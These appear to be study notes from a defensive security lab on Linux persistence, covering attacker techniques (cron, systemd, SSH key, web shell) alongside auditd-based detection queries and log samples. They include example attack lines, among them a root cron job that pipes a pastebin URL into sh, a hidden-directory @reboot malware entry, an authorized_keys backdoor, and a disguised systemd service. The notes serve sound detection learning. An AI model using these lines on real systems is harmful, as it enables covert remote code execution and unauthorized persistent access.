## Cron Persistence

```bash
# A line added by APT29 to /var/spool/cron/<user> to run malware on boot
@reboot nohup /home/<user>/.<hidden-directory>/<malware-name> > /dev/null 2>&1 &

# A simplified command that adds the cron job to /etc/cron.d/root
echo "*/10 * * * root (curl https://pastebin.com/raw/1NtRkBc3) | sh" > /etc/cron.d/root
```

## Systemd Persistence
Systemd services host the most critical system components. Nowadays, DNS, SSH, and nearly every web service are organized as separate .service files located at `/lib/systemd/system` or `/etc/systemd/system` folders. With "root" privileges, you can make your own services, as can the threat actors. For example, the **Sandworm** group once created a "cloud-online" service to enable its GOGETTER malware to run on reboot ([Mandiant report](https://cloud.google.com/blog/topics/threat-intelligence/sandworm-disrupts-power-ukraine-operational-technology/#:~:text=When%20leveraging%20GOGETTER%2C%20Sandworm%20utilized%20a%20Systemd%20service)).

```bash
# A simplified content of /lib/systemd/system/cloud-online.service file
[Unit]
Description=Initial cloud-online job    # Fake description to mimic a trusted service
[Service]
ExecStart=/usr/bin/cloud-online         # GOGETTER malware disguisted as a trusted file
```

## Cron & Systemd Detection
| Descriptions                       | Locations/Actions                                                                                                                                        |
| ---------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Monitor changes in cron job files  | `/etc/crontab`, `/etc/cron.d*`, `/var/spool/cron/*`, `/var/spool/crontab/*`                                                                              |
| Monitor changes in systemd folders | `/lib/systemd/system/*`, `/etc/systemd/system/*`, and [less common](https://manpages.ubuntu.com/manpages/questing/en/man5/systemd.unit.5.html) locations |
| Monitor related processes such as  | `nano /etc/crontab`, `crontab -e`, `systemctl start\|enable <service>`                                                                                   |
```shell-session
# Look for file changes inside /etc/systemd

root@thm-vm:~$ ausearch -i -f /etc/systemd 
type=PROCTITLE msg=audit(09/22/25 16:55:12.740:806) : proctitle=vi /etc/systemd/system/malicious.service
type=PATH msg=audit(09/22/25 16:55:12.740:806) : item=1 name=/etc/systemd/system/malicious.service
type=CWD msg=audit(09/22/25 16:55:12.740:806) : cwd=/
type=SYSCALL msg=audit(09/22/25 16:55:12.740:806) : syscall=openat [...] a2=O_WRONLY|O_CREAT|O_EXCL ppid=1265 pid=1310 uid=root exe=/usr/bin/vi key=systemd

# Look for execution of crontab command

root@thm-vm:~$ ausearch -i -x crontab 
type=PROCTITLE msg=audit(09/22/25 17:25:14.933:807) : proctitle=crontab -e
type=SYSCALL msg=audit(09/22/25 17:25:14.933:807) : syscall=execve [...] ppid=1265 pid=1316 uid=root key=exec
```


## Account Persistence

```shell
# New User Account
cat /var/log/auth.log | grep -E 'useradd|usermod'

# Backdoored SSH Keys
## Adding SSH backdoor to the authorized_keys
echo "AAAAC3Nza...IkiINvQt/R" >> ~/.ssh/authorized_keys
# It's hard to guess which key is a backdoor!
cat ~/.ssh/authorized_keys
# Traces of a backdoor created with "echo [key] >> ~/.ssh/authorized_keys"
ausearch -i -f /.ssh/authorized_keys

```

By default, authorized SSH public keys are stored in each user's `~/.ssh/authorized_keys` file, so your best detection method is to monitor changes to these files using auditd

## Application Persistence
Imagine a WordPress website where the web admin account has been breached. With admin privileges, the attackers can add a backdoor (e.g. a [WSO web shell](https://www.wordfence.com/blog/2017/06/wso-shell/#:~:text=WSO%20is%20designed%20to%20be%20used%20via%20a%20web%20browser)) to the website and run commands through the backdoor - no cron jobs or SSH keys required! Moreover, because the persistence lives in the application layer, auditd and system logs often never see it.
![[Pasted image 20260315111030.png]]